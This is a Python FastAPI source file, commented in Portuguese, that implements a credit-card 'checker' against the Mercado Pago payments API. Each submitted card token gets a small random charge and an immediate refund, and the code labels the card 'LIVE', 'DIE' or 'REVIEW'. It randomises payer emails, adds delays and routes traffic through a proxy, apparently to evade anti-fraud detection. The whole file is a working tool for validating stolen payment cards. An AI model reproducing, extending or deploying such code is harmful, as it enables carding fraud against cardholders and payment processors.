# api_checker.py - VERSÃO FINAL COM HTTPOX CORRIGIDO

import os
import httpx
import random
import string
import asyncio
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from datetime import datetime, timezone
from pydantic import BaseModel

class CardData(BaseModel):
    token: str
    payment_method_id: str

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

ACCESS_TOKEN = os.getenv("ACCESS_TOKEN")
PROXY_URL = os.getenv("PROXY_URL", None)
proxies = {"http://": PROXY_URL, "https://": PROXY_URL} if PROXY_URL else None

@app.get("/")
def get_api_status():
    return {"status": "online", "version": "2.2.0-httpx-final"}

async def estornar_pagamento(payment_id, headers):
    try:
        refund_url = f"https://api.mercadopago.com/v1/payments/{payment_id}/refunds"
        async with httpx.AsyncClient() as client:
            await client.post(refund_url, headers=headers, json={}, timeout=30.0)
    except Exception:
        pass

@app.post("/verificar")
async def verificar_cartao(card_data: CardData):
    await asyncio.sleep(random.uniform(1.5, 3.0))

    if not ACCESS_TOKEN:
        return JSONResponse(status_code=500, content={"status": "DIE", "nome": "Erro de Configuração", "mensagem": "ACCESS_TOKEN não configurado."})

    try:
        token = card_data.token
        payment_method_id = card_data.payment_method_id
        
        random_user = ''.join(random.choices(string.ascii_lowercase, k=10))
        payer_email = f"user_{random_user}@test.com"
        valor_aleatorio = round(random.uniform(0.77, 1.99), 2)
        url = "https://api.mercadopago.com/v1/payments"
        payload = {"transaction_amount": valor_aleatorio, "token": token, "payment_method_id": payment_method_id, "installments": 1, "payer": {"email": payer_email}}
        headers = {"Authorization": f"Bearer {ACCESS_TOKEN}", "Content-Type": "application/json", "X-Idempotency-Key": os.urandom(16).hex()}
        
        async with httpx.AsyncClient(proxies=proxies) as client:
            resposta = await client.post(url, json=payload, headers=headers, timeout=60.0)
        
        resultado = resposta.json()
        status_code = resposta.status_code

        if resultado.get("status") in ["approved", "pending"] or resultado.get("status_detail") == "cc_rejected_insufficient_amount":
            bin_do_cartao = resultado.get('card', {}).get('first_six_digits')
            # Você pode adicionar uma chamada para uma API de BIN aqui se desejar
        
        if status_code in [200, 201] and resultado.get("status") == "approved":
            payment_id = resultado.get("id")
            if payment_id:
                await estornar_pagamento(payment_id, {"Authorization": headers["Authorization"], "Content-Type": headers["Content-Type"]})
            return {"status": "LIVE", "codigo": resultado.get("status_detail"), "nome": "Aprovado (Estornado)", "mensagem": "Pagamento debitado e estornado com sucesso."}

        status_detail = resultado.get("status_detail", "desconhecido")
        if status_detail == "cc_rejected_insufficient_amount":
            return {"status": "LIVE", "codigo": status_detail, "nome": "Saldo Insuficiente", "mensagem": "Cartão válido, mas sem saldo."}
        if resultado.get("status") == "in_process":
            return {"status": "REVIEW", "codigo": status_detail, "nome": "Antifraude", "mensagem": "Cartão com alto potencial, mas retido para análise."}
        return {"status": "DIE", "codigo": status_detail, "nome": f"Recusado ({resultado.get('status', 'erro')})", "mensagem": "Pagamento não aprovado pelo emissor."}

    except httpx.TimeoutException:
        return JSONResponse(status_code=504, content={"status": "DIE", "codigo": "PROXY_TIMEOUT", "nome": "Timeout no Proxy", "mensagem": "A conexão através do proxy demorou demais."})
    except Exception as e:
        return JSONResponse(status_code=500, content={"status": "DIE", "codigo": "INTERNAL_SERVER_ERROR", "nome": "Erro Interno", "mensagem": str(e)})

@app.get("/testar-proxy")
async def testar_proxy():
    if not PROXY_URL:
        return {"status": "inativo", "erro": "PROXY_URL não configurado."}
    
    test_url = "https://www.google.com"
    try:
        async with httpx.AsyncClient(proxies=proxies) as client:
            resposta = await client.get(test_url, timeout=30.0)
        if resposta.status_code == 200:
            return {"status": "ativo", "mensagem": "Conexão com o Google via proxy foi bem-sucedida."}
        else:
            return {"status": "inativo", "erro": f"Proxy conectou, mas o Google respondeu com status {resposta.status_code}"}
    except Exception:
        return {"status": "inativo", "erro": "Falha total ao conectar através do proxy."}
